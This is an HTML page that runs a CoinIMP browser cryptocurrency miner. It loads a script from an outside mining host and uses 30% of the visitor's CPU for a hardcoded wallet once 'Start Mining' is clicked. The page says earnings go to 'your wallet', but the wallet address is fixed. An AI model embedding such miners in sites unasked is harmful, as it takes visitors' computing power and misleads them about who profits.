<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MintMe Mining</title>
    <!-- CoinIMP Mining Script -->
    <script src="https://www.hostingcloud.racing/DUo5.js" async></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #fff;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            padding: 20px;
            margin: 20px auto;
            max-width: 600px;
            background-color: #1c1c1c;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            background-color: #333;
            border: none;
            border-radius: 5px;
            color: #fff;
            cursor: pointer;
        }
        button:hover {
            background-color: #444;
        }
        #status {
            margin-top: 20px;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>MintMe Mining</h1>
        <p>Mine cryptocurrency and send earnings directly to your wallet:</p>
        <p><strong>Wallet Address:</strong> 0x643d9Ee10249F49e946119349D68eC8E72b212e2</p>
        
        <!-- Mining Controls -->
        <button onclick="startMining()">Start Mining</button>
        <button onclick="stopMining()">Stop Mining</button>

        <!-- Status -->
        <p id="status">Status: Idle</p>
    </div>

    <script>
        let miner; // Initialize the miner
        let isMining = false;

        // Set up CoinIMP miner
        document.addEventListener("DOMContentLoaded", () => {
            const publicApiKey = "32a2017c3547001dc3fa511f7b088fa853f51a77525fa25f90cff593676dcbab"; // Your API Key
            miner = new Client.Anonymous(publicApiKey, {
                throttle: 0.3, // Use 30% of the CPU
                wallet: "0x643d9Ee10249F49e946119349D68eC8E72b212e2" // Send mined coins to this wallet
            });
            console.log("Miner initialized successfully.");
        });

        // Start mining
        function startMining() {
            if (!isMining) {
                miner.start();
                isMining = true;
                document.getElementById("status").innerText = "Status: Mining in progress...";
                console.log("Mining started.");
            } else {
                alert("Mining is already running.");
            }
        }

        // Stop mining
        function stopMining() {
            if (isMining) {
                miner.stop();
                isMining = false;
                document.getElementById("status").innerText = "Status: Mining stopped.";
                console.log("Mining stopped.");
            } else {
                alert("Mining is not running.");
            }
        }
    </script>
</body>
</html>
